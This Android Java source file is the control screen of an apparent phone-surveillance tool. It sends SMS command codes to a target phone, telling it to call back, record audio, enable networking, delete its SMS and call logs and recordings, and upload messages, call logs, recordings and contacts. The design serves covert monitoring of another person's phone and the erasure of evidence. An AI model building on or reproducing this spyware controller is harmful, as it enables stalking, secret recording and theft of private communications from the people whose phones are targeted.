package com.zgy.controller;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.os.Handler;
import android.os.Parcelable;
import android.support.v4.view.PagerAdapter;
import android.support.v4.view.ViewPager;
import android.support.v4.view.ViewPager.OnPageChangeListener;
import android.telephony.SmsManager;
import android.text.ClipboardManager;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.view.animation.TranslateAnimation;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.PopupWindow;
import android.widget.RadioButton;
import android.widget.RelativeLayout;
import android.widget.TableLayout;
import android.widget.TextView;
import android.widget.Toast;

/**
 * the control activity
 * 
 * @Description:
 * @author:zhuanggy
 * @see:
 * @since:
 * @Date:2013-5-31
 */
public class CtrlActivity extends Activity implements OnClickListener {

	private static final int PAGE_NUMS = 4;

	private ViewPager viewPager;
	private View[] views;
	// Normal
	private Button btnTurnUp;
	private Button btnTurnDown;
	private Button btnCallMe;
	private Button btnRecorderTime;
	private Button btnRecorderStart;
	private Button btnRecorderStop;
	// Clear
	private Button btnClearSms;
	private Button btnClearCall;
	private Button btnClearCallAudios;
	private Button btnClearOtherAudios;
	private Button btnClearAll;
	// Upload - Wifi
	private Button btnUploadAll_Wifi;
	private Button btnUploadSmsCallLog_Wifi;
	private Button btnUploadCallAudios_Wifi;
	private Button btnUploadOtherAudios_Wifi;
	private Button btnUploadContacts_Wifi;
	private Button btnWifiOpen;
	private Button btnMobileOpen;

	private TextView textPage;
	private ImageView imgBg;
	private PopupWindow mainPopWindow;
	private int pageid = 0;

	private static final int ANIM_BACK_TIEM = 12000;
	private static final int POPWINDOW_DISMISS_DELAY = 350;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.ctrl_activity);

		initViews();
		initListeners();
		viewPager.setAdapter(new ViewPagerAdapter());
		viewPager.setOnPageChangeListener(new MyListener());
	}

	private void initListeners() {
		// Normal
		btnTurnUp.setOnClickListener(this);
		btnTurnDown.setOnClickListener(this);
		btnCallMe.setOnClickListener(this);
		btnRecorderTime.setOnClickListener(this);
		btnRecorderStart.setOnClickListener(this);
		btnRecorderStop.setOnClickListener(this);
		btnWifiOpen.setOnClickListener(this);
		btnMobileOpen.setOnClickListener(this);
		// Clear
		btnClearSms.setOnClickListener(this);
		btnClearCall.setOnClickListener(this);
		btnClearCallAudios.setOnClickListener(this);
		btnClearOtherAudios.setOnClickListener(this);
		btnClearAll.setOnClickListener(this);
		// Upload-wifi
		btnUploadAll_Wifi.setOnClickListener(this);
		btnUploadSmsCallLog_Wifi.setOnClickListener(this);
		btnUploadCallAudios_Wifi.setOnClickListener(this);
		btnUploadOtherAudios_Wifi.setOnClickListener(this);
		btnUploadContacts_Wifi.setOnClickListener(this);
		textPage.setOnClickListener(new View.OnClickListener() {

			@Override
			public void onClick(View v) {
				pageid++;
				viewPager.setCurrentItem(pageid % PAGE_NUMS, true);
			}
		});
	}

	private void initViews() {
		viewPager = (ViewPager) findViewById(R.id.viewpager_flippershow);
		LayoutInflater inflater = getLayoutInflater();
		View viewNormal = inflater.inflate(R.layout.page_normal, null);
		View viewClear = inflater.inflate(R.layout.page_clear, null);
		View viewUploadWifi = inflater.inflate(R.layout.page_upload_wifi, null);
		View viewAbout = inflater.inflate(R.layout.page_about, null);

		views = new View[PAGE_NUMS];
		views[0] = viewNormal;
		views[1] = viewClear;
		views[2] = viewUploadWifi;
		views[3] = viewAbout;

		btnTurnUp = (Button) viewNormal.findViewById(R.id.btn_turn_up);
		btnTurnDown = (Button) viewNormal.findViewById(R.id.btn_turn_down);
		btnCallMe = (Button) viewNormal.findViewById(R.id.btn_call_me);
		btnRecorderTime = (Button) viewNormal.findViewById(R.id.btn_record_time);
		btnRecorderStart = (Button) viewNormal.findViewById(R.id.btn_record_start);
		btnRecorderStop = (Button) viewNormal.findViewById(R.id.btn_record_end);
		btnWifiOpen = (Button) viewNormal.findViewById(R.id.btn_open_wifi);
		btnMobileOpen = (Button) viewNormal.findViewById(R.id.btn_open_mobile);

		// Clear
		btnClearSms = (Button) viewClear.findViewById(R.id.btn_del_msg_log);
		btnClearCall = (Button) viewClear.findViewById(R.id.btn_del_call_log);
		btnClearCallAudios = (Button) viewClear.findViewById(R.id.btn_del_call_audios);
		btnClearOtherAudios = (Button) viewClear.findViewById(R.id.btn_del_other_audios);
		btnClearAll = (Button) viewClear.findViewById(R.id.btn_del_all);
		// Upload - Wifi
		btnUploadAll_Wifi = (Button) viewUploadWifi.findViewById(R.id.btn_upload_all_wifi);
		btnUploadSmsCallLog_Wifi = (Button) viewUploadWifi.findViewById(R.id.btn_upload_msg_call_log_wifi);
		btnUploadCallAudios_Wifi = (Button) viewUploadWifi.findViewById(R.id.btn_upload_call_audio_wifi);
		btnUploadOtherAudios_Wifi = (Button) viewUploadWifi.findViewById(R.id.btn_upload_other_audio_wifi);
		btnUploadContacts_Wifi = (Button) viewUploadWifi.findViewById(R.id.btn_upload_contacts_wifi);

		textPage = (TextView) findViewById(R.id.textview_page);
		imgBg = (ImageView) findViewById(R.id.image_bg);
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
	}

	@Override
	protected void onResume() {
		if (!GlobleCs.is_open) {
			startActivity(new Intent(CtrlActivity.this, MainActivity.class));
			finish();
		} else {
			runBgAnimation();
		}
		super.onResume();
	}

	@Override
	protected void onPause() {
		Log.e("", "onPause");
		GlobleCs.is_open = false;
		super.onPause();
	}

	class ViewPagerAdapter extends PagerAdapter {

		@Override
		public int getCount() {
			return views.length;// 不循环往复滑动
		}

		@Override
		public boolean isViewFromObject(View arg0, Object arg1) {
			return arg0 == arg1;
		}

		@Override
		public int getItemPosition(Object object) {
			return super.getItemPosition(object);
		}

		@Override
		public void destroyItem(View arg0, int arg1, Object arg2) {
			((ViewPager) arg0).removeView(views[arg1 % views.length]);
		}

		@Override
		public Object instantiateItem(ViewGroup container, int position) {
			return super.instantiateItem(container, position);
		}

		@Override
		public void setPrimaryItem(ViewGroup container, int position, Object object) {
			super.setPrimaryItem(container, position, object);
		}

		@Override
		public Object instantiateItem(View arg0, int arg1) {
			((ViewPager) arg0).addView(views[arg1 % views.length], 0);
			return views[arg1];
		}

		@Override
		public void restoreState(Parcelable arg0, ClassLoader arg1) {
		}

		@Override
		public Parcelable saveState() {
			return null;
		}

		@Override
		public void startUpdate(View arg0) {
		}

		@Override
		public void finishUpdate(View arg0) {
		}
	}

	/**
	 * 页面切换监听器
	 * 
	 * @Description:
	 * @author: zhuanggy
	 * @see:
	 * @since:
	 * @copyright © 35.com
	 * @Date:2013-3-15
	 */
	class MyListener implements OnPageChangeListener {

		@Override
		public void onPageScrollStateChanged(int arg0) {
			// 滚动后
		}

		@Override
		public void onPageScrolled(int arg0, float arg1, int arg2) {
			// 滚动中
		}

		@Override
		public void onPageSelected(int arg0) {
			Log.e("", "arg0=" + arg0);
			pageid = arg0;
			setCurPage(arg0);
		}
	}

	@Override
	public void onClick(View v) {
		switch (v.getId()) {
		case R.id.btn_turn_up:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UP, null);
			break;
		case R.id.btn_turn_down:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DOWN, null);
			break;
		case R.id.btn_call_me:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_CALL_ME, null);
			break;
		case R.id.btn_record_time:
			showPopWindow(true, GlobleCs.FIRST + GlobleCs.PHONE_CODE_RECORD_TIME, null);
			break;
		case R.id.btn_record_start:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_RECORD_START, null);
			break;
		case R.id.btn_record_end:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_RECORD_END, null);
			break;
		case R.id.btn_open_wifi:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_TURNON_WIFI, null);
			break;
		case R.id.btn_open_mobile:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_TURNON_MOBILE, null);
			break;
		case R.id.btn_del_msg_log:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_MSG_LOG, null);
			break;
		case R.id.btn_del_call_log:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_CALL_LOG, null);
			break;
		case R.id.btn_del_call_audios:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_AUDIOS_CALL, null);
			break;
		case R.id.btn_del_other_audios:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_AUDIOS_OTHER, null);
			break;
		case R.id.btn_del_all:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_ALL_LOG, null);
			break;
		case R.id.btn_upload_all_wifi:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_ALL, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_ALL_MOBILE);
			break;
		case R.id.btn_upload_msg_call_log_wifi:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_SMS_CALL, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE);
			break;
		case R.id.btn_upload_call_audio_wifi:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_CALL, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE);
			break;
		case R.id.btn_upload_other_audio_wifi:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_OTHER, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE);
			break;
		case R.id.btn_upload_contacts_wifi:
			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_CONTACTS, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_CONTACTS_MOBILE);
			break;
		default:
			break;
		}

	}

	private void sendMsg(String content) {
		try {
			SmsManager sms = SmsManager.getDefault();
			String num = ControllerApplication.getInstence().getControlTel();
			if (num == null || num.equals("")) {
				Toast.makeText(CtrlActivity.this, R.string.send_command_error, Toast.LENGTH_SHORT).show();
			} else {
				sms.sendTextMessage(num, "", content, null, null);
				Toast.makeText(CtrlActivity.this, R.string.send_command_success, Toast.LENGTH_SHORT).show();
			}
		} catch (Exception e) {
			e.printStackTrace();
			Toast.makeText(CtrlActivity.this, R.string.send_command_fail, Toast.LENGTH_SHORT).show();
		}

	}

	/****************************/

	private void showPopWindow(final boolean inputView, final String content, final String contentMobile) {

		DisplayMetrics dMetrics = new DisplayMetrics();
		getWindowManager().getDefaultDisplay().getMetrics(dMetrics);

		LayoutInflater inflater = getLayoutInflater();
		View layout;

		RelativeLayout layoutPop;

		if (!inputView) {
			layout = inflater.inflate(R.layout.layout_pop_normal, null);

			Button btnOk = (Button) layout.findViewById(R.id.btn_pop_normal_ok);
			Button btnCopy = (Button) layout.findViewById(R.id.btn_pop_normal_copy);
			layoutPop = (RelativeLayout) layout.findViewById(R.id.layout_pop_normal_main);

			final TextView textCode = (TextView) layout.findViewById(R.id.text_pop_normal_code_show);
			final TableLayout layoutSelect = (TableLayout) layout.findViewById(R.id.layout_wifi_mobile_select);
			textCode.setText(content);

			if (contentMobile == null) {
				layoutSelect.setVisibility(View.GONE);
			} else {
				layoutSelect.setVisibility(View.VISIBLE);
				final RadioButton radioWifi = (RadioButton) layout.findViewById(R.id.radiobtn_wifi);
				final RadioButton radioWifiGprs = (RadioButton) layout.findViewById(R.id.radiobtn_gprs_wifi);
				radioWifi.setChecked(true);
				radioWifi.setOnClickListener(new View.OnClickListener() {

					@Override
					public void onClick(View v) {
						radioWifiGprs.setChecked(false);
						radioWifi.setChecked(true);
						textCode.setText(content);

					}
				});

				radioWifiGprs.setOnClickListener(new View.OnClickListener() {

					@Override
					public void onClick(View v) {
						radioWifiGprs.setChecked(true);
						radioWifi.setChecked(false);
						textCode.setText(contentMobile);
					}
				});

			}

			btnOk.setOnClickListener(new View.OnClickListener() {

				@Override
				public void onClick(View v) {
					sendMsg(textCode.getText().toString());
					new Handler().postDelayed(new Runnable() {

						@Override
						public void run() {
							mainPopWindow.dismiss();
						}
					}, POPWINDOW_DISMISS_DELAY);
				}
			});
			btnCopy.setOnClickListener(new View.OnClickListener() {

				@Override
				public void onClick(View v) {
					setClipboard(textCode.getText().toString());
					new Handler().postDelayed(new Runnable() {

						@Override
						public void run() {
							mainPopWindow.dismiss();
						}
					}, POPWINDOW_DISMISS_DELAY);
				}
			});

		} else {
			layout = inflater.inflate(R.layout.layout_pop_input, null);

			Button btnNext = (Button) layout.findViewById(R.id.btn_pop_input_ok);
			// Button btnCancel = (Button)
			// layout.findViewById(R.id.btn_pop_input_cancel);
			final EditText editInput = (EditText) layout.findViewById(R.id.edit_pop_input);
			layoutPop = (RelativeLayout) layout.findViewById(R.id.layout_pop_input_main);
			btnNext.setOnClickListener(new View.OnClickListener() {

				@Override
				public void onClick(View v) {
					if (TextUtils.isEmpty(editInput.getText())) {
						Toast.makeText(CtrlActivity.this, R.string.input_string_alarm, Toast.LENGTH_SHORT).show();
					} else {
						final int min = Integer.parseInt(editInput.getText().toString());
						if (min > 0 && min < 100) {
							hideKeyboard(v);
							new Handler().postDelayed(new Runnable() {

								@Override
								public void run() {
									mainPopWindow.dismiss();
									showPopWindow(false, content + min, null);
								}
							}, POPWINDOW_DISMISS_DELAY);

						} else {
							Toast.makeText(CtrlActivity.this, R.string.input_int_alarm, Toast.LENGTH_SHORT).show();
							editInput.setText("");
						}
					}
				}
			});
		}

		// layoutPop.setOnClickListener(new View.OnClickListener() {
		//
		// @Override
		// public void onClick(View v) {
		// mainPopWindow.dismiss();
		// }
		// });
		layoutPop.setBackgroundColor(0xAA000000);
		mainPopWindow = new PopupWindow(layout, dMetrics.widthPixels, (int) (dMetrics.heightPixels * 0.6), true);
		mainPopWindow.setBackgroundDrawable(new ColorDrawable(Color.argb(5, 255, 255, 255)));
		mainPopWindow.setOutsideTouchable(true);
		mainPopWindow.setAnimationStyle(R.style.popupwindow_style);
		mainPopWindow.showAtLocation(findViewById(R.id.layout_ctrl_main), Gravity.BOTTOM, 0, dMetrics.heightPixels);
	}

	/********************/

	/**
	 * 页码翻转效果
	 * 
	 * @Description:
	 * @param page
	 * @see:
	 * @since:
	 * @date:2013-5-25
	 */
	private void setCurPage(final int page) {
		Animation a = AnimationUtils.loadAnimation(CtrlActivity.this, R.anim.scale_in);
		a.setAnimationListener(new Animation.AnimationListener() {

			@Override
			public void onAnimationStart(Animation animation) {
			}

			@Override
			public void onAnimationRepeat(Animation animation) {
			}

			@Override
			public void onAnimationEnd(Animation animation) {
				textPage.setText((page + 1) + "");
				textPage.startAnimation(AnimationUtils.loadAnimation(CtrlActivity.this, R.anim.scale_out));
				switch (page) {
				case 0:
					textPage.setBackgroundResource(R.drawable.bg_round_green);
					break;
				case 1:
					textPage.setBackgroundResource(R.drawable.bg_round_blue);
					break;
				case 2:
					textPage.setBackgroundResource(R.drawable.bg_round_yellow);
					break;
				case 3:
					textPage.setBackgroundResource(R.drawable.bg_round_red);
					break;

				default:
					break;
				}

			}
		});
		textPage.startAnimation(a);

	}

	/**
	 * 背景大图的左右移动
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @date:2013-5-25
	 */
	private void runBgAnimation() {
		final Animation right = new TranslateAnimation(Animation.RELATIVE_TO_PARENT, 0f, Animation.RELATIVE_TO_PARENT, -1f, Animation.RELATIVE_TO_PARENT, 0f, Animation.RELATIVE_TO_PARENT, 0f);
		final Animation left = new TranslateAnimation(Animation.RELATIVE_TO_PARENT, -1f, Animation.RELATIVE_TO_PARENT, 0f, Animation.RELATIVE_TO_PARENT, 0f, Animation.RELATIVE_TO_PARENT, 0f);
		right.setDuration(ANIM_BACK_TIEM);
		left.setDuration(ANIM_BACK_TIEM);
		right.setFillAfter(true);
		left.setFillAfter(true);

		right.setAnimationListener(new Animation.AnimationListener() {

			@Override
			public void onAnimationStart(Animation animation) {
			}

			@Override
			public void onAnimationRepeat(Animation animation) {
			}

			@Override
			public void onAnimationEnd(Animation animation) {
				imgBg.startAnimation(left);
			}
		});
		left.setAnimationListener(new Animation.AnimationListener() {

			@Override
			public void onAnimationStart(Animation animation) {
			}

			@Override
			public void onAnimationRepeat(Animation animation) {
			}

			@Override
			public void onAnimationEnd(Animation animation) {
				imgBg.startAnimation(right);
			}
		});
		imgBg.startAnimation(right);
	}

	public void setClipboard(String text) {
		ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
		clipboard.setText(text);
		Toast.makeText(CtrlActivity.this, R.string.copy_to_clipboard_success, Toast.LENGTH_SHORT).show();
	}

	private void hideKeyboard(View v) {
		// 隐藏软件盘
		InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
		imm.hideSoftInputFromWindow(v.getWindowToken(), 0);
	}

}
